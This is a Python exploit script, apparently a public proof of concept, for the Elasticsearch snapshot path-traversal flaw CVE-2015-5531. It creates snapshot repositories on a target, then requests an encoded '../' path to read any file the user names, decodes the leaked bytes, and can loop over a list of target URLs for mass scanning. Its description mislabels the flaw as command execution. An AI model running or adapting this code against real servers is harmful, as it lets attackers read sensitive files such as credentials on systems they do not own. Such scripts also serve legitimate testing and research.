from ast import Store
import re
import urllib3
import argparse
import requests
import json
from urllib.parse import quote_plus
import sys

urllib3.disable_warnings()

def decode1(result):

    p = result
    q=p.replace(',','')  #将数值中间的/替换为,

    list = q.split(" ") #将字符串转换为列表


    list2=[]

    for i in list:
        x=int(i)
        str = chr(x)
        list2.append(str)  #将列表里的int型的ascii数值转换为字符串类型并加入至空列表内

    #print(list2)
    ss=''.join(list2) #将列表转换为字符串
    print(ss)

def do_banner():
    print("")
    print("  _______      ________    ___   ___  __ _____       _____ _____ ____  __ ")
    print(" / ____\ \    / /  ____|  |__ \ / _ \/_ | ____|     | ____| ____|___ \/_ |")
    print("| |     \ \  / /| |__ ______ ) | | | || | |__ ______| |__ | |__   __) || |")
    print("| |      \ \/ / |  __|______/ /| | | || |___ \______|___ \|___ \ |__ < | |")
    print("| |____   \  /  | |____    / /_| |_| || |___) |      ___) |___) |___) || |")
    print(" \_____|   \/   |______|  |____|\___/ |_|____/      |____/|____/|____/ |_|")
    print("")

proxy = {
    'http' : '127.0.0.1:8080',
    'https' : '127.0.0.1:8080'
}

if __name__ == "__main__":

    do_banner()

    parser = argparse.ArgumentParser(description='Elasticsearch Command Execute (CVE-2015-5531)')
    parser.add_argument('-u',action="store",dest="url",help="The url to test")
    parser.add_argument('-f',action="store",dest="file",required=True,help="The file path")
    parser.add_argument('-l',action="store",dest="list",help="The url list")
    args = parser.parse_args()

    if args.url and args.list:
        print("User specified both '-u' and '-l'. Only one may be chosen")
        sys.exit(1)

    if not args.url and not args.list:
        print("User specified neither '-u' nor '-l'. User must choose one")
        sys.exit(1)
    
    if args.file:
        print('[+] Generating a payload')
        header={
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
        }
        file_path=args.file
        exploit=(quote_plus(file_path))
        data1='''{
            "type": "fs",
            "settings": {
                "location": "/usr/share/elasticsearch/repo/test"
            }
        }'''
        data2='''{
            "type": "fs",
            "settings": {
                "location": "/usr/share/elasticsearch/repo/test/snapshot-backdata"
            }
        }'''
    
    if args.url:
        print('[+] Sending exploit at '+args.url)
        try:
            r=requests.put(args.url+'/_snapshot/test',data=data1,proxies=proxy,headers=header)
            if r.status_code ==200 and '"acknowledged":true' in r.text:
                r=requests.put(args.url+'/_snapshot/test2',data=data2,proxies=proxy,headers=header)
                if  r.status_code ==200 and '"acknowledged":true' in r.text:
                    r=requests.get(args.url+'/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..'+exploit,proxies=proxy,headers=header)
                    result=re.compile(r': (.*?)","').findall(r.text)
                    #print(result)
                    print('''

                        ---------------------------
                        -----------decode----------
                        ---------------------------
                        ''')
                    data1 = result[0].replace(']','')
                    data2 = data1.replace('[','')
                    decode1(data2)


        except:
            print('[-] The HTTP request failed')
            sys.exit(0)

    if args.list:
        print('Loading url file...')
        with open(args.list, 'r') as file:
            f = file.readlines()
        for i in f:
            i = i.strip('\n')
            try:
                r=requests.put(i+'/_snapshot/test',data=data1,proxies=proxy,headers=header)
                if r.status_code ==200 and '"acknowledged":true' in r.text:
                    r=requests.put(i+'/_snapshot/test2',data=data2,proxies=proxy,headers=header)
                    if  r.status_code ==200 and '"acknowledged":true' in r.text:
                        r=requests.get(i+'/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..'+exploit,proxies=proxy,headers=header)
                        result=re.compile(r': (.*?)","').findall(r.text)
                        #print(result)
                        print('''

                        ---------------------------
                        -----------decode----------
                        ---------------------------
                        ''')
                    data1 = result[0].replace(']','')
                    data2 = data1.replace('[','')
                    decode1(data2)
            except:
                print('[-] The HTTP request failed')
                sys.exit(0)

